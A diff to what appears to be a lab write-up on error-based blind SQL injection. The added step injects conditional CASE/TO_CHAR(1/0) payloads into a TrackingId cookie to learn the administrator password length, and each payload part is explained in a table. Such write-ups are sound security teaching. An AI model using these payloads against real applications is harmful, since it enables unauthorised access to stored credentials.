@@ -296,7 +296,7 @@ The different responses confirmed that I could control whether an error appeared
   <img src="images/step5-2.png" width="600">
 </p>
 
-## Step 6 — Checking if the Administrator User Exists
+## Step 6 — Checking if the `Administrator` User Exists
 
 After confirming that I could trigger errors based on conditions, I tested whether the `administrator` user existed in the `users` table.
 
@@ -329,4 +329,46 @@ The error response confirmed that the `administrator` user exists in the `users`
 
 <p align="center">
   <img src="images/step6-1.png" width="600">
+</p>
+
+## Step 7 — Finding the Password Length
+
+After confirming that the `administrator` user existed, I needed to find the length of the password.
+
+I used the `LENGTH()` function to check the password size by testing different values:
+
+```sql
+TrackingId=08ITKoawSkZtY2wE'||(SELECT CASE WHEN LENGTH(password)>1 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+```
+**Breakdown**
+
+| Part | Description |
+|---|---|
+| `08ITKoawSkZtY2wE` | The original tracking ID from the application |
+| `'` | Closes the original string in the SQL query |
+| `||` | Concatenates the original value with the result of another SQL expression |
+| `(SELECT CASE WHEN LENGTH(password)>1 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')` | Executes a conditional subquery that checks the administrator user's password length. If the condition is true, it triggers an error. |
+| `CASE WHEN LENGTH(password)>1` | Checks whether the administrator password length is greater than 1 character |
+| `TO_CHAR(1/0)` | Forces a division-by-zero error when the condition is true. The error response confirms that the condition matched. |
+| `ELSE ''` | Returns an empty string when the condition is false |
+| `FROM users` | Specifies that the query is executed against the `users` table |
+| `WHERE username='administrator'` | Targets only the user account with the username `administrator` |
+| `||` | Concatenates the subquery result with the remaining part of the SQL query |
+| `'` | Closes the injected SQL string to keep the query syntax valid |
+
+The application returned an error, which meant the condition was true. This confirmed that the password length was greater than 1 character.
+
+<p align="center">
+  <img src="images/step7-1.png" width="600">
+</p>
+
+I repeated this process until the error stopped appearing.
+
+```sql id="s8j3nd"
+TrackingId=08ITKoawSkZtY2wE'||(SELECT CASE WHEN LENGTH(password)>20 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+```
+In this lab, the error stopped after testing a length greater than 20, which means the password length was exactly 20 characters.
+
+<p align="center">
+  <img src="images/step7-2.png" width="600">
 </p>
